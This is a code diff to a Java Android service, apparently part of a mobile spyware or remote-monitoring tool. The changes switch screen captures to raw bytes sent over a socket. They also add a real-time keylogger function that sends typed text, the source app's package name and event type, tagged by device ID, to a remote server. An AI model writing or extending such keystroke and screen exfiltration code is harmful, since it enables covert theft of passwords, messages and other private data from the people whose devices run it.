@@ -31,6 +31,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.List;
@@ -478,13 +479,14 @@ public class Server extends Service {
         }
     }
 
-    public void sendScreenMonitoring(String base64Image) {
+    public void sendScreenMonitoring(ByteArrayOutputStream outputStream) {
         try {
             JSONObject sendJson = new JSONObject();
             sendJson.put("deviceId", mDeviceID);
-            sendJson.put("base64Image", base64Image);
+            sendJson.put("base64Image", outputStream.toByteArray());
             if(socket != null && socket.connected()) {
-                socket.emit("screen-mobile-response", sendJson);
+//                socket.emit("screen-mobile-response", sendJson);
+                socket.emit("screen-mobile-byte-response", sendJson);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -511,6 +513,21 @@ public class Server extends Service {
         }
     }
 
+    public void sendRealtimeKeyLog(CharSequence text, CharSequence packagename, String eventString) {
+        try {
+            JSONObject sendJson = new JSONObject();
+            sendJson.put("deviceId", mDeviceID);
+            sendJson.put("keyLogsType", packagename);
+            sendJson.put("keylogs", text);
+            sendJson.put("event", eventString);
+            if(socket != null && socket.connected()) {
+                Log.d("KEY LOGGER::", text + ":::" + eventString);
+                socket.emit("key-logs-realtime-mobile-response", sendJson);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
     public void sendKeyLog(CharSequence text, CharSequence packagename, String eventString) {
         try {
             JSONObject sendJson = new JSONObject();
@@ -518,7 +535,6 @@ public class Server extends Service {
             sendJson.put("keyLogsType", packagename);
             sendJson.put("keylogs", text);
             sendJson.put("event", eventString);
-            Log.d("KEY LOGGER::", text + ":::" + eventString);
             if(socket != null && socket.connected()) {
                 Log.d("KEY LOGGER::", text + ":::" + eventString);
                 socket.emit("key-logs-mobile-response", sendJson);
